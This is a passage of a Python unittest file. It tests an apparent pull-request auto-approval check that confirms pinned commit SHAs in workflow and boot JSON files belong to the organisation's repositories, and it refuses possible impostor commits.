                self.assertIn("default branch is unreadable", abr.check_pins(case("workflow_sha_bump"), api) or "")

    def test_third_party_uses_not_checked(self) -> None:
        api = PinApi({})
        self.assertIsNone(abr.check_pins(case("workflow_version_comment"), api))
        self.assertEqual(api.calls, [])

    def test_real_boot_commits_reachable(self) -> None:
        files = case("boot_commit")
        self.assertIsNone(check(files))
        self.assertEqual(sorted(set(abr.org_pins(files))), sorted({
            ("tap-plugin-compliance-core", COMPLIANCE_SHA, "boot/core_ci.boot.json"),
            ("tap-plugin-github-core", GITHUB_CORE_SHA, "boot/core_ci.boot.json"),
            ("tap-plugin-compliance-core", COMPLIANCE_SHA, "boot/test_all.boot.json"),
            ("tap-plugin-github-core", GITHUB_CORE_SHA, "boot/test_all.boot.json"),
        }))
        api = PinApi(boot_compares())
        self.assertIsNone(abr.check_pins(files, api))
        self.assertEqual(sum(1 for c in api.calls if c[0] == "compare"), 4)
        self.assertIsNone(abr.check_pins(files, PinApi(boot_compares(github_core="identical"))))

    def test_impostor_boot_commit_refused(self) -> None:
        for status, fragment in (("diverged", "compare says diverged"), ("behind", "compare says behind"),
                                 (NOT_FOUND, "could not verify")):
            with self.subTest(status):
                why = abr.check_pins(case("boot_commit"), PinApi(boot_compares(github_core=status)))
                self.assertIn(fragment, why or "")
                self.assertIn("tap-plugin-github-core@d157f3f1d457", why or "")

    def test_boot_commit_url_not_in_diff_refused(self) -> None:
        url = '          "url": "https://github.com/unified-systems-com/tap-plugin-compliance-core",\n'
        files = edit(case("boot_commit"), "boot/core_ci.boot.json", " " + url, "")
        self.assertIn("does not show its entry's `url`", abr.check_pins(files, PinApi(boot_compares())) or "")

    def test_boot_commit_url_of_another_entry_not_used(self) -> None:
        # The url line sits in the object above, not this one: not this entry's url.
        patch = ('@@ -5,6 +5,6 @@\n       "url": "https://github.com/unified-systems-com/tap"\n     },\n     "source": {\n'
                 '       "type": "git",\n-      "commit": "' + OLD_SHA + '"\n+      "commit": "' + NEW_SHA + '"\n')
        files = one_file("boot/x.boot.json", patch)
        self.assertIsNone(check(files))
        self.assertIn("does not show its entry's `url`", abr.check_pins(files, PinApi({})) or "")

    def test_boot_commit_odd_url_of_ours_refused(self) -> None:
        files = edit(case("boot_commit"), "boot/core_ci.boot.json", "unified-systems-com/tap-plugin-compliance-core\"",
                     "unified-systems-com/tap-plugin-compliance-core/tree/main\"")
        self.assertIn("not a plain repository URL", abr.check_pins(files, PinApi(boot_compares())) or "")

    def test_boot_commit_of_a_third_party_not_checked(self) -> None:
        files = case("boot_commit")
        for f in files:
            f["patch"] = f["patch"].replace("github.com/unified-systems-com/", "github.com/someone-else/")
        api = PinApi({})
        self.assertIsNone(abr.check_pins(files, api))
        self.assertEqual(api.calls, [])

    def test_boot_rev_that_is_a_sha_checked(self) -> None:
        patch = DUO_BOOT_PATCH.replace('"commit"', '"rev"')
        files = one_file("tap_plugin/duo/boot/ci.boot.json", patch)
        self.assertIsNone(check(files))
        key = "unified-systems-com/tap-plugin-identity-core 63da037c77355369f91748127a74c7a17e00a7f9...main"
        self.assertIsNone(abr.check_pins(files, PinApi({key: "ahead"})))
        self.assertIn("compare says diverged", abr.check_pins(files, PinApi({key: "diverged"})) or "")

    def test_whole_decision_refuses_impostor_boot_commit(self) -> None:
        self.fx["files"] = case("boot_commit")
        self.fx["pulls"][0]["changed_files"] = 2
        self.fx["org_repos"] = {r: {"full_name": r, "default_branch": "main"} for r in (COMPLIANCE, GITHUB_CORE)}
        self.fx["compares"] = boot_compares()
        self.assertTrue(decide(self.fx).approve)
        self.fx["compares"] = boot_compares(compliance="diverged")
        d = decide(self.fx)
        self.assertFalse(d.approve)
        self.assertIn("possible impostor commit", d.reason)


if __name__ == "__main__":
    unittest.main()
